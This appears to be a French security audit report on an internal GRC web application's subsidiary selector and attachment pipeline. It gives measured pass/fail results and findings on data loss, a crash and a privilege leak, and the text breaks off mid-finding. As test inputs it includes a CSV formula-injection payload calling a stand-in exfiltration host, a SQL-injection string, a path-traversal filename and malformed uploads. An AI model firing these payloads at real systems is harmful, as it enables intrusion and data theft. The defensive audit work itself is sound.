# Porte S5 — audit indépendant de la vague 4 : L4 (sélecteur de filiale) et L6 (pièces jointes)

> **Révision auditée** : `76879e9382cd4fec9f419042bed4cf98af8994a9`
> (« Q-132 : la lecture de `filiales` est cloisonnée — et mon contrat était faux »),
> branche `claude/vague-3-planning-review-6zgbch`. Arbre **propre** au début et à la fin de
> l'audit (`git status --porcelain` vide dans les deux cas).
> Périmètre : les commits `664c6dc` (la vague), `e5bd363` (le contrat §32) et `76879e9`
> (migration `010`).
> **Auditeur** : SECU — n'a écrit aucune des lignes examinées, n'écrit que dans
> `docs/securite/`.
> **Date** : 04/09/2026. **Machine** : `SRV-Infra`, VM Debian 13 réelle, PostgreSQL 17.11,
> Apache 2.4.68 (Debian) sur `https://grc.exemple.interne/`, service `cyber-grc` sous
> systemd, ClamAV `clamd` actif, Active Directory Samba réel en LDAPS. La recette sert le
> code du jour : `dist/` daté du 04/09 12:07, migrations `009` et `010` appliquées à
> 12:07:03.

---

## Verdict global

> ### ❌ **Porte S5 refusée. Quatre contrôles en échec : S1, S3, S13, S18.**
> **Le cœur des deux lots tient, et il tient bien.** L'invariant central de L4 — *le client
> envoie un choix, le serveur résout un périmètre* — a résisté à **dix formes d'attaque
> mesurées** (en-tête, requête, cookie, URL, corps, méthode) : aucune ne déplace le
> périmètre d'un pouce. La chaîne des huit contrôles de L6 s'exécute **dans l'ordre
> annoncé**, l'EICAR est détecté et mis en quarantaine, un `.docm` renommé `.docx` est
> refusé par ce que Word y a écrit, et le cloisonnement des pièces jointes est exact **dans
> les deux sens, sur des tables non vides**.
> **Treize constats neufs (Q-134 → Q-146)**, dont **un qui bloque le fonctionnement** et
> **deux de la classe « fuite ou perte de données »**.

Sous l'arbitrage du `PLAN_EXECUTION` §0 bis, la porte **trie**. Le tri, constat par constat :

| Classe | Constats | Traitement |
|---|---|---|
| **Bloque le fonctionnement** | **Q-135** — `analyser()` (`src/pieces/clamav.ts`) pose le gestionnaire d'erreur du flux de lecture **dans** `socket.on('connect')`. Un fichier illisible fait donc mourir le processus sur un `Unhandled 'error' event`. **Mesuré 6 fois sur 6 sur le point d'entrée réel de la ré-analyse** (`dist/pieces/exploitation.js`), qui n'a **aucun** filet ; le serveur d'API, lui, en a un, et il l'arrête (`exit(1)` → redémarrage systemd, toutes requêtes en vol coupées) | corrigé avant la fin de la vague |
| **Fuite ou perte de données** | **Q-134** — l'étape 3 bis de L4 refuse en `hors_perimetre`, code que `js/core/api.js` réserve au refus **par ligne** et que `js/core/sync.js` traite en **abandonnant la saisie**. Mesuré de bout en bout, Chromium réel → Apache → PostgreSQL : une saisie en attente **disparaît de l'écran et ne revient pas au rechargement**, dans le scénario même que L4 existe pour couvrir. <br> **Q-136** — `010` accorde `execute` sur `f_filiales_actives()` à `grc_app` mais **n'en révoque pas PUBLIC**, ce que `008` fait trois lignes plus loin pour ses deux fonctions. Mesuré : `grc_lecture`, à qui la table `filiales` rend **0 ligne**, obtient par cette fonction **la liste complète des filiales actives du groupe** | corrigé, sans négociation |
| **Tout le reste** | **Q-137** → **Q-146** | marqué **`V1.1`**, la vague continue |

⚠️ **Ce que ce verdict ne dit pas.** Aucun des treize constats ne remet en cause
l'invariant de L4 (§30.2), ni le cloisonnement des pièces jointes, ni l'ordre des huit
contrôles, ni le resserrement de `filiales` du côté des sessions applicatives. Ce sont les
promesses centrales des deux lots, et elles sont tenues, mesurées, et rejouées par
mutation. Ce qui est en cause est ce qui les entoure : un code d'erreur mutualisé qui
détruit une saisie (Q-134), un gestionnaire d'erreur posé une ligne trop bas (Q-135), un
`revoke` oublié (Q-136), et une série d'écarts entre ce que les contrats promettent et ce
que le code fait.

---

## 1. Ce que j'ai mesuré, et qui tient

Cette section existe parce qu'un rapport qui ne dit que ce qui ne va pas ne permet pas de
savoir ce qui est acquis. Chaque ligne porte sa mesure.

### 1.1 Le banc, sur la révision auditée

```
$ cd backend && set -a && source ~/.grc-essais.env && set +a && npm test
ℹ tests 1285
ℹ suites 306
ℹ pass 1285
ℹ fail 0
ℹ duration_ms 141069.12666
EXIT=0
$ npm run verifier-types      → exit 0 (tsc --noEmit, mode strict)
$ git status --porcelain      → (vide)
```

**1285/1285, arbre propre, à `76879e9`.** Le corollaire 7 est respecté : c'est bien une
**révision** qui est verte. Les familles `test/navigateur/` et `test/modules/` ont bien
tourné — Playwright est résolu à `/usr/lib/node_modules/playwright`, Chromium à
`/opt/pw-browsers`.

**⚠️ `npm audit --omit=dev` EST jouable ici, et il passe.** Le rapport S4 le classait
« non vérifiable ici — aucun réseau sortant », et huit passages de porte l'avaient reconduit :

```
$ cd backend && npm audit --omit=dev
found 0 vulnerabilities
CODE=0        (90 s de délai de garde, réponse immédiate)
```

Le contrôle **S15 est donc rejoué et passé** pour la première fois. C'est le constat Q-128
appliqué : *une réserve écrite n'est pas une réserve traitée* — et celle-ci coûtait une
commande.

### 1.2 L'invariant de L4 tient — dix formes d'attaque, aucune n'ouvre

Le §30.1 dit que le sélecteur est *« le seul endroit du produit où l'invariant peut se
perdre »*. Mesuré sur le service réel, avec `rssi.tls` (périmètre = TLS seule) tentant de
voir DEU. Le témoin est la liste des actions, qui diffère entre les deux filiales :

```
témoin sans rien       => actions= 3  titres= ['a-secu', 'A', "x'); drop table actions; --"]
?filiale=<DEU>         => actions= 3  (identique)
?filiale_id=<DEU>      => actions= 3
?perimetre=<DEU>       => actions= 3
X-Filiale: <DEU>       => actions= 3
X-Filiale-Id: <DEU>    => actions= 3
X-Grc-Filiale: <DEU>   => actions= 3
Grc-Filiales: <DEU>    => actions= 3
X-Perimetre: <DEU>     => actions= 3
```

**Aucune ne bouge d'une ligne.** Et le titre `x'); drop table actions; --`, qui vit en base
depuis un essai antérieur, ressort **tel quel** : la condition E1 (tout paramétré) tient
sur ce chemin.

### 1.3 Le refus du sélecteur ne dit pas si la filiale existe — l'oracle est fermé

```
$ curl -b tls -X PUT .../api/session/filiale-active -d '{"filiale":"<DEU, réelle>"}'
403 {"erreur":"hors_perimetre","message":"Cette filiale ne fait pas partie de votre périmètre…"}
$ curl -b tls -X PUT .../api/session/filiale-active -d '{"filiale":"FIL-0000…ffff"}'   (inexistante)
403 {"erreur":"hors_perimetre","message":"Cette filiale ne fait pas partie de votre périmètre…"}
```

**Même statut, même corps, même longueur (282 octets).** Le nom de la filiale est lu
**après** l'`update` qui constate l'appartenance, jamais avant : c'est ce qui ferme
l'oracle, et c'est écrit dans le code au bon endroit.

Et le succès existe : `rssi.groupe` (périmètre TLS + DEU) bascule en **200**, quatre fois
sur quatre pendant l'audit.

### 1.4 `GET /api/filiales` rend le périmètre, pas le groupe

```
TLS : {"filiales":[{"code":"TLS", … ,"active":true}]}                       (1 filiale)
GRP : {"filiales":[{"code":"DEU", …},{"code":"TLS", … ,"active":true}]}     (2 filiales)
base : 2 filiales                                                          (matière présente)
```

Le contrôle de matière est fait : la table **n'est pas vide**, donc le `1` de TLS distingue
bien « cloisonné » de « rien à voir » (constat Q-104 respecté).

### 1.5 L'étape 3 bis fonctionne, uniformément, sans exemption

Sabotage temporaire, restauré : j'ai retiré de `session_filiales` la filiale **active**
d'une session ouverte (le scénario du §30.3 — les groupes AD changent en cours de session),
puis interrogé cinq surfaces différentes :

```
GET  /api/donnees                     -> 403 hors_perimetre
GET  /api/session                     -> 403 hors_perimetre
POST /api/entites/actions             -> 403 hors_perimetre
POST /api/pieces/documents/DOC-3BIS   -> 403 hors_perimetre
PUT  /api/session/filiale-active      -> 403 hors_perimetre
```

Aucune route n'est exemptée, et le refus est **tracé** : 5 entrées `refus_autorisation`
portant `motif: filiale_active_hors_perimetre`. *(La ligne `session_filiales` a été
réinsérée et la session de sonde révoquée ; vérifié : `0` session ouverte dont la filiale
active manque à son périmètre.)*

### 1.6 Le cloisonnement des pièces jointes est exact, dans les deux sens, sur des lignes réelles

Deux pièces déposées par l'API : une dans TLS, une dans DEU (`rssi.groupe`, filiale active
= DEU). Puis, depuis TLS :

```
GET    /api/pieces/documents/DOC-DEU-1/<PJ de DEU>  -> 404 ressource_inconnue
GET    /api/pieces/documents/DOC-DEU-1              -> 200 {"pieces":[]}
DELETE /api/pieces/documents/DOC-DEU-1/<PJ de DEU>  -> 404 ressource_inconnue
```

Et le **404 ne distingue pas** « ailleurs » d'« inexistante » : un identifiant de pièce
valide sur un mauvais `entiteId`, ou sur une mauvaise `entite`, rend exactement le même
corps. Le chemin d'entité est donc réellement contraignant — une pièce du domaine
`incidents` ne se lit pas par l'URL `documents`.

### 1.7 La chaîne des huit contrôles, éprouvée sur le service réel

| Ce que j'ai envoyé | Réponse |
|---|---|
| PE (`MZ…`) renommé `.pdf` | **400** « le contenu ne correspond pas à son extension » |
| `.svg`, `.html`, `.exe` | **400** « formats admis : .pdf, .png, .jpg, .jpeg, .docx, .xlsx, .pptx, .csv, .txt » |
| `x.pdf.exe` | **400** (extension = le **dernier** point) |
| `sansext`, `x.pdf.` | **400** « pas d'extension exploitable » |
| `../../etc/passwd.pdf` | **201**, stocké sous `passwd.pdf` (le chemin est réduit à son dernier segment) |
| **EICAR** en `.txt` | **400** « menace détectée », ligne `etat_analyse=infectee`, `quarantaine=t`, `signature_virale=Eicar-Test-Signature` |
| `.docm` renommé `.docx` | **400** « documents contenant des macros » |
| `.docx` propre **avec** `word/vbaProject.bin` | **400** « macros » — le contrôle ne se laisse pas tromper par un `[Content_Types].xml` honnête |
| ZIP nu renommé `.docx` | **400** « une archive, pas un document » |
| `.docx` tronqué de moitié | **400** |
| `.docx` à 5 000 entrées | **400** (borne d'entrées) |
| **bombe** : 50 Mio de zéros compressés en 51 Ko | **201** — et c'est correct : `zip.ts` ne décompresse **que** `[Content_Types].xml`, il n'y a donc pas de bombe à faire exploser |
| `.docx` précédé de 512 octets non-ZIP | **400** (les décalages ne tombent plus juste) |
| corps de 30 Mio, `Content-Length` annoncé | **413**, refusé après **2 949 120** octets reçus |
| le même en `Transfer-Encoding: chunked`, **au service direct** | **413** — le compteur en flux fait son travail |
| le même **à travers Apache** | **411** — le frontal refuse tout `Transfer-Encoding` sur `/api/` |

L'empreinte est **celle du disque** : `sha256sum sain.pdf` rend
`cfa3181c1ee36e8bce5e39f84959f4558ea7ba32c0e4539a8ab3c8ce8c716ec6`, exactement la valeur
que la base a enregistrée.

Le **chemin de stockage n'emprunte rien** au déposant. Relevé sur le journal de la
ré-analyse : `…/pj/3d/ac/3dac57491de5f534dd639c24caea7678eb849d97d2e3b3bfd33b9aa34c29b43c`
— 64 signes hexadécimaux, ni nom de fichier, ni filiale, ni entité. Et il **ne sort jamais
sur le réseau** : `versLaVue()` le retire, aucune réponse de l'audit ne l'a porté.

### 1.8 La délivrance : `attachment`, `nosniff`, type **constaté**, nom assaini

```
$ curl -b tls .../api/pieces/documents/DOC-MP/<PJ> -D -
HTTP/1.1 200 OK
content-type: application/pdf
content-disposition: attachment; filename="a.pdf"; filename*=UTF-8''a.pdf
x-content-type-options: nosniff
content-length: 69
cache-control: no-store
```

Le repli ASCII de `Content-Disposition` est une **liste blanche** (`[^A-Za-z0-9._-]` → `_`)
et la forme RFC 5987 est en pourcentage-encodage intégral : ni guillemet, ni CRLF, ni
point-virgule ne peut sortir de la citation. Le type est celui **constaté** au contrôle
n° 4, jamais celui annoncé.

**Les logos suivent leur propre règle** : `admin.grc` dépose un PNG en **201** ; le même
compte se voit refuser un PDF (« un logo doit être une image .png ou .jpg ou .jpeg — les
autres formats sont refusés, y compris SVG ») et un SVG. Et `rssi.tls`, qui n'a pas le
domaine `administration`, reçoit **403** sur `/api/pieces/logo/…` : *l'interface n'est pas
la barrière*, le serveur refuse (contrôle S6).

### 1.9 L'analyseur multipart écrit à la main — dix-sept formes hostiles, aucune surprise

Envois construits à la main, hors `curl -F`, directement sur le service :

```
[201] témoin normal
[400] filename avec " brut                 (« pas d'extension exploitable »)
[201] Content-Disposition répété           -> le PREMIER gagne : « premier.pdf »
[201] filename répété dans l'en-tête       -> le PREMIER gagne : « ok.pdf »
[201] deux parties « fichier »             -> la PREMIÈRE gagne : « un.pdf »
[400] corps tronqué                        (« l'envoi est mal formé »)
[400] content-type sans boundary
[400] content-type application/json        (« attend un envoi de formulaire »)
[400] 20 parties                           (borne MAX_PARTIES)
[201] frontière recopiée DANS le contenu   -> non confondue
[201] CONTENT-DISPOSITION en majuscules
[201] préambule contenant la frontière
[400] filename* (RFC 5987) seul            -> délibérément ignoré, donc « aucun fichier »
[201] name/filename non cités
[415] content-type « multipart/form-data-truc »
[400] filename de 4 000 signes
[201] filename portant U+202E (inversion d'affichage)
```

Aucune forme ne fait écrire un octet hors des contrôles, aucune ne fabrique un chemin,
aucune ne provoque de boucle. Les trois `[201]` de « le premier gagne » sont une
**pollution de paramètres** classique et sans effet ici (un seul analyseur), mais elles
méritent d'être connues.

### 1.10 Q-118 à Q-133 : rejeu des correctifs sur le service réel

| Constat | Rejeu | Verdict |
|---|---|---|
| **Q-118** | `GET /api/journal/verification?depuis=1` depuis `rssi.tls` (1 filiale) → **403 `droit_insuffisant`** ; depuis `admin.grc` (périmètre Groupe) → **200** | ✅ fermé, il mord |
| **Q-119** | `GET /api/journal?limite=5` → `utilisateur_libelle` = `admin.grc`, `rssi.tls` — le **login**, pas le nom d'affichage | ✅ fermé |
| **Q-121** | Export CSV : la charge `=WEBSERVICE("http://exfil.example")` présentée par un attaquant **non authentifié** ressort en `"'=WEBSERVICE(…)"` — désamorcée | ✅ fermé |
| **Q-123** | `verification?depuis=200` → `{"sain":true, "anomalies":[{… "chaine_tronquee" …}]}` : l'anomalie **informative** est rendue et ne fait plus crier le verdict | ✅ fermé |
| **Q-132** | Politique en base : `case when f_est_proprietaire_base() … when f_perimetre_groupe() … else id = any(f_filiales_lecture()) end`, **sans** mention de `f_authentification()`. `f_perimetre_groupe()` est `security definer`, propriétaire `grc_proprietaire`, `search_path=pg_catalog, public, pg_temp`. `select count(*) from f_verifier_schema()` → **0** | ✅ fermé côté sessions applicatives — **mais voir Q-136** |
| **Q-133** | Couvert par le banc (garde-fou statique), non rejoué à la main | ⚪ |

### 1.11 Le journal de L4 dit ce qu'il doit dire

Quatre basculements réussis pendant l'audit → **exactement 4** entrées
`changement_perimetre`, chacune portant la filiale quittée et la filiale rejointe :

```
232 | fil=<TLS> | rssi.groupe | avant=<TLS> -> apres=<DEU>
239 | fil=<DEU> | rssi.groupe | avant=<DEU> -> apres=<TLS>
240 | fil=<TLS> | rssi.groupe | avant=<TLS> -> apres=<DEU>
242 | fil=<TLS> | rssi.groupe | avant=<TLS> -> apres=<DEU>
```

Le `resume` est une phrase fixe ; les deux identifiants voyagent en `jsonb` (§29.5 tenu).
Le vocabulaire de la contrainte `ck_journal_audit_action` compte bien **21** valeurs, et
`ActionJournal` (TypeScript) les mêmes : les deux listes se font face.

Et l'échappement du CSV résiste à la valeur d'utilisateur que L4 introduit : une filiale
demandée valant `=WEBSERVICE("http://x")\r\nX` ressort dans une cellule qui **commence par
`{`** (c'est l'objet `valeurs_apres` entier), et le CRLF y est encodé en JSON — la ligne
CSV n'est ni scindée ni évaluable.

### 1.12 Le timer de ré-analyse est réellement armé

```
$ systemctl is-enabled cyber-grc-reanalyse.timer   → enabled
$ systemctl is-active  cyber-grc-reanalyse.timer   → active
$ systemctl list-timers cyber-grc-reanalyse.timer
NEXT                        LEFT  LAST PASSED UNIT
Sat 2026-09-05 00:22:01 UTC 11h   -    -      cyber-grc-reanalyse.timer
```

Il n'a **jamais tourné** (`LAST` vide). Voir **Q-135** : au premier passage sur un stock
comportant une pièce dont le fichier manque, il mourra.

---

## 2. Verdict par contrôle de la grille §4

| # | Contrôle | Verdict | Sur quoi |
|---|---|---|---|
| **S1** | Cloisonnement par filiale non contournable | ❌ **en échec**, pour **une seule raison, et ce n'est pas une session applicative** | Les sessions applicatives sont cloisonnées, mesuré dans les deux sens sur des tables non vides (§1.4, §1.6). Mais `f_filiales_actives()` est exécutable par **PUBLIC** : le rôle d'exploitation `grc_lecture`, à qui `filiales` rend 0 ligne, en obtient la liste complète — **Q-136**. |
| **S2** | Le périmètre ne vient jamais du navigateur | ✅ **passé** | Dix formes d'attaque, aucune n'ouvre (§1.2) ; le choix est rangé dans `sessions.filiale_active_id`, jamais dans un cookie ni un en-tête ; `resoudre()` ne prend toujours aucun argument. |
| **S3** | Journal d'audit inaltérable et complet | ❌ **en échec** | Inaltérable : non rejoué ici, S4 l'a mordu. **Complet : non.** La ré-analyse périodique n'écrit **rien** dans `journal_audit` — une mise en quarantaine découverte six mois après le dépôt ne laisse aucune trace inaltérable (**Q-140**). Q-125 reste ouvert. |
| **S4** | Verrouillage optimiste | ⚪ sans objet | Hors surface L4/L6, non rejoué. |
| **S5** | Aucune injection SQL | ✅ **passé** | `src/pieces/depot.ts` est intégralement paramétré (seules les listes de colonnes sont littérales) ; le titre `x'); drop table actions; --` traverse le produit **en donnée** (§1.2). |
| **S6** | Droits vérifiés côté serveur | ✅ **passé** | `rssi.tls` → **403** sur `/api/pieces/logo/…` (domaine `administration` absent) ; `:entite` hors énumération → **400** avant tout accès base. Le refus vient du crochet `onRequest`, pas de la route. |
| **S7** | Le droit d'export est distinct de la lecture | ✅ **passé, avec un arbitrage que j'ai examiné et que je ne conteste pas** | Voir §5 ci-dessous : l'arbitrage du §31.5 (« ouvrir une pièce est une lecture ») est **cohérent avec le motif** du `PLAN_SERVEUR` §3.3. Ce qui est en défaut est la garde qui l'entoure (**Q-141**) et les trois conséquences que le §31.5 en tire, toutes fausses (**Q-144**). |
| **S8** | Secrets | ✅ **passé** | `chemin_stockage` n'apparaît dans aucune réponse ni aucune charge `jsonb` (vérifié sur 20 dépôts) ; aucun message de PostgreSQL ne sort. |
| **S9** | Pièces jointes | ❌ **en échec** | La chaîne d'ingestion est juste (§1.7). Ce qui échoue est autour : **Q-135** (le client antivirus tue le processus), **Q-139** (famine de la ré-analyse entre filiales), **Q-140** (aucune trace au journal), **Q-138** (quota). |
| **S10** | Sortie et en-têtes | ✅ **passé** | `attachment` + `nosniff` + `no-store` + type constaté + nom assaini deux fois (§1.8). CSP, HSTS, `X-Frame-Options: DENY` mesurés au frontal. |
| **S11** | Limitation du rythme et verrouillage | ❌ **voir S13** | Le limiteur ne compte **que** les refus d'identité (401). 30 refus `403` consécutifs en boucle : aucun ralentissement, 30 entrées définitives au journal (**Q-143**). |
| **S12** | Les erreurs ne renseignent pas l'attaquant | ✅ **passé** | 403 du sélecteur identique pour une filiale réelle et pour une inexistante (§1.3) ; 404 des pièces identique pour « ailleurs » et « inexistante » (§1.6) ; les refus de type ne nomment ni signature ni octets attendus. |
| **S13** | Dénis de service applicatifs | ❌ **en échec** | **Q-135** : un fichier illisible abat le processus (6/6). **Q-143** : deux chemins d'écriture non bornés dans une table en ajout seul et non purgeable, dont un porte une valeur choisie par le client. **Q-138** : le corps entier est matérialisé en mémoire (≈ 25 Mio/requête) sans aucune limite de concurrence, sous `MemoryMax=2G`. |
| **S14** | Intégrité des opérations composites | ✅ **passé** | Insertion + les deux traces sont dans une transaction ; l'échec de l'insertion retire le fichier promu ; le changement de filiale et sa trace sont atomiques (le contrôle d'appartenance est **dans** l'`update`, pas avant). |
| **S15** | Dépendances | ✅ **passé — et c'est la première fois qu'il est joué** | `npm audit --omit=dev` → « found 0 vulnerabilities », exit 0, réponse immédiate. La réserve « pas de réseau sortant » que huit passages reconduisaient est **fausse** (§1.1). |
| **S16** | Les garde-fous sont branchés | ✅ **passé** | `f_verifier_lecture_filiales()` et `f_verifier_vocabulaire_journal()` consignées au registre et découvertes par `f_verifier_schema()` ; `select count(*) from f_verifier_schema()` → **0** sur la base de recette. Le garde-fou du substrat a **refusé le premier jet de `010`**, ce qui est la meilleure preuve qu'il mord. |
| **S17** | Le chemin complet a été parcouru pour de vrai | ✅ **passé** | Chromium réel → Apache réel → AD réel → PostgreSQL, connexion, sélecteur, bascule et écriture — et c'est ce parcours qui a produit **Q-134**. |
| **S18** | Le produit fait ce qu'il doit faire | ❌ **en échec** | **Q-134** : le produit **détruit la saisie de son utilisateur** dans le scénario que L4 existe pour couvrir. **Q-137** : une réponse d'API rend `null, null` là où elle doit nommer une filiale. **Q-146** : on peut déposer un logo, jamais le désigner. |

---

## 3. Les constats

### 🛑 Q-134 — L'étape 3 bis de L4 fait **détruire la saisie de l'utilisateur** par le navigateur

**Classe : perte de données (2ᵉ classe du §0 bis) — corrigé sans négociation.**

**Le mécanisme, en trois lignes de trois fichiers différents.** L4 ajoute à
`src/api/index.ts` un refus **de session**, à l'étape 3 bis du crochet `onRequest` :

```ts
throw new ErreurApplicative({
  code: 'hors_perimetre',           // ← src/api/index.ts:783 (NOUVEAU dans 664c6dc)
  statut: 403,
  message: 'Votre périmètre a changé : la filiale dans laquelle vous travailliez ne vous est plus ouverte…',
});
```

Or `js/core/api.js:179` réserve ce code au refus **par ligne** :

```js
estRefusDroit() { return this.code === "hors_perimetre"; }
```

et `js/core/sync.js:1551` en tire la conséquence qui va avec un refus par ligne :

```js
if (erreur.estRefusDroit()) {
    // Refus de DROIT : le serveur n'a rien changé, et son état nous est connu.
    // On remet donc la mémoire à cet état…
    revenirALaValeurServeur(collection, id, geste);
```

Le commentaire d'`api.js` dit exactement pourquoi c'était sûr **avant** L4 : *« c'est
acceptable pour `hors_perimetre` — la ligne visée n'appartient pas à la filiale, il n'y a
rien à conserver »*. Avec l'étape 3 bis, il y a quelque chose à conserver : **la saisie que
l'utilisateur vient de taper**, refusée pour une raison qui n'a rien à voir avec la ligne.

**Vérification que c'est bien nouveau** : avant la vague 4, `src/api/index.ts` ne comptait
**aucune** occurrence de `code: 'hors_perimetre'` (`git grep -c hors_perimetre 11d4716 --
backend/src` → `api/index.ts:1`, une mention de documentation). `664c6dc` en ajoute deux
dans ce fichier et deux dans `src/pieces/index.ts`.

**La mesure — Chromium réel, Apache réel, AD réel, PostgreSQL réel** :

```
1. filiale active après connexion : <TLS>
2. options du sélecteur : ["<DEU>|Dedienne Aerospace Deutschland (DEU)","<TLS>|Dedienne Aerospace Toulouse (TLS)"]
3. filiale active après bascule : <DEU>          (par le <select> réel)
4. session visée : SESS-1788525686177-fb649c5c657140779fb09a368474a0d0
5. saisie créée en mémoire : ACT-1788525686529-1-11n3g9qoxohwt — présente : true
6. filiale active retirée du périmètre de la session      (les groupes AD changent)
7.  cycle ok
8. APRÈS le refus — saisie encore présente ? false | en attente : false | incidents : 1
9. ce que la page dit : ["PÉRIMÈTRE",
     "1 modification(s) non enregistrée(s).",
     "Écriture refusée — Action ACT-1788525686529-1-11n3g9qoxohwt : Votre périmètre a changé :
      la filiale dans laquelle vous travailliez ne vous est plus ouverte. Reconnectez-vous…"]
9 bis. après RECHARGEMENT de la page, la saisie est-elle revenue ? false
```

**Ce que l'utilisateur voit** : un bandeau qui annonce « 1 modification non enregistrée »,
lui donne l'**identifiant technique** de ce qu'il a perdu, et lui demande de se
reconnecter. Ce qu'il a tapé n'est plus à l'écran, n'est plus en mémoire, et **ne revient
pas au rechargement** — la branche `estRefusDroit()` rend la main *avant* la branche qui
alimente `creationsBloquees`, le filet posé pour le constat Q-29.

**Pourquoi c'est grave dans ce produit précis** : le scénario n'est pas exotique, c'est
**celui que L4 a été écrit pour couvrir** (§30.3, « la fenêtre à fermer, et elle est
réelle »). Un utilisateur dont l'administrateur retire un groupe AD pendant qu'il saisit un
risque perd sa saisie, dans un outil qui sert de preuve en audit ISO 27001.

**Ce que le banc ne pouvait pas voir** : rien ne rougit. 1285/1285. `test/filiales/`
mesure — très bien — que la filiale ne bouge pas et que le refus est tracé ; personne ne
demande *« et qu'advient-il de ce que l'utilisateur avait tapé ? »*. C'est le corollaire 1,
et c'est la **quatrième fois** que le motif « un même mot, vrai à un endroit et faux à
l'autre » coûte un constat à ce chantier (6ᵉ passage de S2, Q-29, Q-113, celui-ci).

**Rejeu** : `/tmp/…/scratchpad/s5-perte-saisie.mjs` (script Playwright, hors dépôt). Il
restaure `session_filiales` et révoque la session de sonde en sortant.

**Piste** — elle n'est pas de mon ressort, mais le discriminant est clair : ce n'est pas le
**code HTTP** qui doit décider du geste, c'est la **situation**. Un refus qui porte sur la
*session* n'a pas la même réponse qu'un refus qui porte sur la *ligne*. Deux codes, ou un
discriminant dans la charge, mais pas la même étiquette pour les deux.

---

### 🛑 Q-135 — Un fichier illisible **abat le processus** : `analyser()` pose son gestionnaire d'erreur une ligne trop bas

**Classe : bloque le fonctionnement — corrigé avant la fin de la vague.**

`src/pieces/clamav.ts:136` ouvre le flux **immédiatement** :

```ts
const lecture = createReadStream(chemin, { highWaterMark: TAILLE_BLOC });
```

mais son gestionnaire d'erreur est posé **à l'intérieur** de `socket.on('connect')`
(`clamav.ts:191`, à l'intérieur du `socket.on('connect')` ouvert ligne 186) :

```ts
socket.on('connect', () => {
  …
  lecture.on('error', (erreur) => {
    echouer(new ErreurClamav(`lecture du fichier à analyser impossible : ${erreur.message}`));
  });
```

L'échec d'`open(2)` remonte du pool de threads **avant** que le socket unix ne signale
`connect`. L'événement `'error'` du flux n'a alors aucun auditeur, et Node lève
`Unhandled 'error' event`.

**Mesure 1 — la fonction seule, 5 exécutions sur 5** :

```
$ node s5-clamav-enoent.mjs      # analyser('/var/lib/cyber-grc/attente/ce-fichier-n-existe-pas', …)
essai 1 : code=1  node:events:497  throw er; // Unhandled 'error' event
essai 2 : code=1  …
essai 3 : code=1  …   essai 4 : code=1  …   essai 5 : code=1  …
```

**Mesure 2 — le point d'entrée RÉEL de la ré-analyse, celui que systemd lance, 6 passages
sur 6** :

```
$ CHEMIN_PIECES_JOINTES=<magasin vide> node dist/pieces/exploitation.js
Ré-analyse périodique : aucune conclusion — derniere_reanalyse inchangée. { id: 'PJ-…', motif: "…ENOENT…" }
node:events:497
      throw er; // Unhandled 'error' event
Error: ENOENT: no such file or directory, open '…/pj/35/99/35997c72…'
Emitted 'error' event on ReadStream instance at: emitErrorNT (node:internal/streams/destroy:170:8)

passage 1 : code=1  crash=1  traitees=0
passage 2 : code=1  crash=1  traitees=3
passage 3 : code=1  crash=1  traitees=0
passage 4 : code=1  crash=1  traitees=1
passage 5 : code=1  crash=1  traitees=2
passage 6 : code=1  crash=1  traitees=1
```

Le nombre de pièces traitées **avant** la mort varie (0 à 3) : c'est une **course** entre
la remontée de l'erreur du flux et l'événement `connect` du socket, gagnée tantôt par
l'une, tantôt par l'autre. Elle se perd toujours à la fin.

**Ce que cela coûte, aux deux endroits où le code tourne :**

| Où | Filet | Conséquence |
|---|---|---|
| `dist/pieces/exploitation.js` (timer systemd) | **aucun** — `main()` n'installe ni `uncaughtException` ni `unhandledRejection` | Le passage s'arrête à la première pièce dont le fichier manque. **Toutes les pièces suivantes ne sont jamais ré-analysées**, jour après jour, et le bilan n'est jamais rendu. |
| `dist/serveur.js` (l'API) | `process.on('uncaughtException')` → `arreter('exception', 1)` (`src/serveur.ts:622-626`) | `exit(1)` → `Restart=on-failure` : **toutes les requêtes en vol sont coupées** et le service redémarre. Déclenchable par un `EMFILE` ou une perte de fichier entre l'écriture et l'analyse. |

**L'état est atteignable, et le produit le sait** : `delivrer()` traite explicitement le cas
« fichier absent du magasin » (`src/pieces/index.ts:763-770`, message « fichier absent du magasin », ligne 769). Il devient certain après une
restauration où la base et le magasin ne sont pas au même point — ce que le `README` §… met
lui-même en garde.

**Le commentaire dit l'inverse, deux fois.** `clamav.ts:22-25` énumère cinq défaillances et
conclut « **Aucune ne rend un verdict** » — vrai, mais la liste omet la seule qui ne rend
pas non plus d'erreur : elle tue le processus. Et `exploitation.ts:316-320` écrit :

```ts
// `clamav.analyser()` ne lève QUE `ErreurClamav` pour ses échecs de protocole ;
// toute autre exception (ex. ENOENT si le fichier a disparu du magasin) est un
// fait distinct, nommé distinctement.
const prefixe = erreur instanceof ErreurClamav ? '' : 'défaut inattendu : ';
```

**Ce `catch` est inatteignable pour l'ENOENT qu'il nomme.**

Le timer est armé sur cette machine et **n'a jamais tourné** (`LAST` vide, prochain passage
le 05/09 à 00:22 UTC).

**Rejeu** : `/tmp/…/scratchpad/s5-clamav-enoent.mjs`, et le point d'entrée réel avec
`CHEMIN_PIECES_JOINTES` pointant sur un répertoire vide. Aucune écriture en base : les six
passages ont laissé `derniere_reanalyse` à `null` sur les 20 pièces, `max(version) = 1`.

---

### 🛑 Q-136 — `010` accorde `f_filiales_actives()` à `grc_app` et **oublie de la révoquer à PUBLIC**

**Classe : fuite de données (2ᵉ classe du §0 bis) — corrigé sans négociation.**

La migration `010` écrit :

```sql
do $$ begin
    if exists (select 1 from pg_roles where rolname = 'grc_app') then
        execute 'grant execute on function f_filiales_actives() to grc_app';
    end if;
end; $$;
```

Il n'y a **aucun `revoke ... from public`**. Or PostgreSQL accorde `EXECUTE` à `PUBLIC` par
défaut sur toute fonction créée. La migration `008`, elle, fait le geste trois lignes avant
son `grant` :

```sql
revoke execute on function f_journal_audit_chainage() from public;
revoke execute on function f_journal_audit_verifier(bigint) from public;
```

**La preuve est dans le catalogue** — l'entrée `=X/…` désigne PUBLIC :

```
         proname          |                                        proacl
--------------------------+--------------------------------------------------------------------
 f_journal_audit_chainage | {grc_proprietaire=X/grc_proprietaire}
 f_journal_audit_verifier | {grc_proprietaire=X/grc_proprietaire,grc_app=X/grc_proprietaire}
 f_filiales_actives       | {=X/grc_proprietaire,grc_proprietaire=X/…,grc_app=X/…}
                             ^^^ PUBLIC
```

**La conséquence, mesurée avec le compte d'exploitation `grc_lecture` :**

```
-- La table elle-même est bien fermée :
$ psql -U grc_lecture -c "select id, code, raison_sociale, adresse, telephone from filiales;"
ERROR:  Périmètre non positionné : la transaction lit une table cloisonnée…

$ psql -U grc_lecture -c "begin; select set_config('grc.filiales','',true);
